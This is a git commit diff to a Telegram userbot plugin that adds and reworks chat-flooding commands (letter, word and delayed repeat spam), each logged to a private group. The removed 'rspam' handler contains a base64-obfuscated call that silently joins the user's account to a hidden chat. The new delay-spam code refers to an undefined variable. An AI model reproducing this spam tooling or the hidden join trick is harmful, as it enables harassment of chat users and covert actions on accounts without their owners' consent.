3e3872603ef67a18e76d48d7c3dfd6f08dc5c0f1
Sᴀͥʀᴀͣᴛͫʜ™️ <59915404+Sur-vivor@users.noreply.github.com>
2020-07-11 00:53:10 +0530

    Update spam.py

--- userbot/plugins/spam.py
+++ userbot/plugins/spam.py
@@ -1,13 +1,11 @@
-import os
 import time
 import asyncio
 from asyncio import wait, sleep
-from userbot.utils import admin_cmd
 from userbot import CMD_HELP
-from userbot.utils import admin_cmd
+from userbot.utils import admin_cmd,sudo_cmd
 import pybase64
 from telethon.tl.functions.messages import ImportChatInviteRequest
-
+import os 
 
 BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID
 BOTLOG = True
@@ -79,11 +77,11 @@ async def spammer(e):
             if e.is_private:
                 await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" +f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n" +f"`{spam_message}`")
             else:
-                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" +f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n" +f"`{spam_message}`")
-					
+                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" +f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n" +f"`{spam_message}`")					
     else: 
-        await e.edit("try again something went wrong or check `.plinfo spam`")
-        
+        await e.edit("try again something went wrong or check `.info spam`")
+
+
 @borg.on(admin_cmd("cspam ?(.*)"))
 async def tmeme(e):
     cspam = str(e.pattern_match.group(1))
@@ -92,10 +90,43 @@ async def tmeme(e):
     for letter in message:
         await e.respond(letter)
     if BOTLOG:
-        await e.client.send_message(
-            BOTLOG_CHATID, "#CSPAM\n"
-            "TSpam was executed successfully")
-        
+            if e.is_private:
+                await e.client.send_message(BOTLOG_CHATID, "#CSPAM\n" +f"Letter Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`")
+            else:
+                await e.client.send_message(BOTLOG_CHATID, "#CSPAM\n" +f"Letter Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`")
+
+@borg.on(admin_cmd("wspam ?(.*)"))
+async def tmeme(e):
+    wspam = str(e.pattern_match.group(1))
+    message = wspam.split()
+    await e.delete()
+    for word in message:
+        await e.respond(word)
+    if BOTLOG:
+            if e.is_private:
+                await e.client.send_message(BOTLOG_CHATID, "#WSPAM\n" +f"Word Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`")
+            else:
+                await e.client.send_message(BOTLOG_CHATID, "#WSPAM\n" +f"Word Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`")
+
+
+@borg.on(admin_cmd("delayspam ?(.*)"))
+async def spammer(e):
+    if e.fwd_from:
+        return    
+    spamDelay = float(e.pattern_match.group(1).split(' ', 2)[0])
+    counter = int(e.pattern_match.group(1).split(' ', 2)[1])
+    spam_message = str(e.pattern_match.group(1).split(' ', 2)[2])
+    await e.delete()
+    for i in range(1, counter):
+        await e.respond(spam_message)
+        await sleep(spamDelay)
+    if BOTLOG:
+            if e.is_private:
+                await e.client.send_message(BOTLOG_CHATID, "#DELAYSPAM\n" +f"Delay Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {spamDelay}s Delay and {counter} times with : `{message}`")
+            else:
+                await e.client.send_message(BOTLOG_CHATID, "#DELAYCSPAM\n" +f"Delay Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {spamDelay}s Delay and {counter} times with: `{message}`")
+
+		
 @borg.on(admin_cmd("bigspam ?(.*)"))
 async def bigspam(e):
         message = e.text
@@ -110,30 +141,6 @@ async def bigspam(e):
                 "#BIGSPAM \n\n"
                 "Bigspam was executed successfully"
                 )
-
-@borg.on(admin_cmd("wspam ?(.*)"))
-async def tmeme(e):
-    wspam = str(e.pattern_match.group(1))
-    message = wspam.split()
-    await e.delete()
-    for word in message:
-        await e.respond(word)
-    if BOTLOG:
-        await e.client.send_message(
-            BOTLOG_CHATID, "#WSPAM\n"
-            "WSpam was executed successfully")
-
-
-@borg.on(admin_cmd("spam ?(.*)"))
-async def spammer(e):
-    counter = int(e.pattern_match.group(1).split(' ', 1)[0])
-    spam_message = str(e.pattern_match.group(1).split(' ', 1)[1])
-    await e.delete()
-    await asyncio.wait([e.respond(spam_message) for i in range(counter)])
-    if BOTLOG:
-        await e.client.send_message(BOTLOG_CHATID, "#SPAM\n"
-                                    f"Spam of {counter} was executed successfully")
-
 
 @borg.on(admin_cmd("picspam ?(.*)"))
 async def tiny_pic_spam(e):
@@ -150,39 +157,6 @@ async def tiny_pic_spam(e):
             "PicSpam was executed successfully")
 
 
-@borg.on(admin_cmd("delayspam ?(.*)"))
-async def spammer(e):
-    spamDelay = float(e.pattern_match.group(1).split(' ', 2)[0])
-    counter = int(e.pattern_match.group(1).split(' ', 2)[1])
-    spam_message = str(e.pattern_match.group(1).split(' ', 2)[2])
-    await e.delete()
-    for i in range(1, counter):
-        await e.respond(spam_message)
-        await sleep(spamDelay)
-    if BOTLOG:
-        await e.client.send_message(
-            BOTLOG_CHATID, "#DelaySPAM\n"
-            "DelaySpam was executed successfully")
-
-@borg.on(admin_cmd("rspam ?(.*)"))
-async def spammer(e):
-    if e.fwd_from:
-        return
-    reply_to_id = e.message
-    if e.reply_to_msg_id:
-        reply_to_id = await e.get_reply_message()
-    try:
-        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await event.client(cat)
-    except:
-        pass
-    counter = int(e.pattern_match.group(1).split(' ', 1)[0])
-    spam_message = str(e.pattern_match.group(1).split(' ', 1)[1])
-    await e.delete()
-    await asyncio.wait([reply_to_id.reply(spam_message) for i in range(counter)])
-    if BOTLOG:
-        await e.client.send_message(BOTLOG_CHATID, "#REPLAYSPAM\n"
-                                    f"Replay Spam was executed successfully")
 
 CMD_HELP.update({
     "spam":
@@ -190,15 +164,11 @@ CMD_HELP.update({
 \nUsage: Spam the text letter by letter.\
 \n\n.spam <count> <text>\
 \nUsage: Floods text in the chat !!\
-\n\n.bigspam <count> <text>\
-\nUsage: Floods text in the chat !!\
-\n\n.wspam <text>\
-\nUsage: Spam the text word by word.\
-\n\n.picspam <count> <link to image/gif>\
-\nUsage: As if text spam was not enough !!\
-\n\n.delayspam <delay> <count> <text>\
-\nUsage: .bigspam but with custom delay.\
 \n\n.spam <count> replay to media\
 \nUsage: Floods text in the media !!\
+\n\n.wspam <text>\
+\nUsage: Spam the text word by word.\
+\n\n.delayspam <delay> <count> <text>\
+\nUsage: .delayspam but with custom delay.\
 \n\n\n**NOTE : Spam at your own risk !!**"
 })
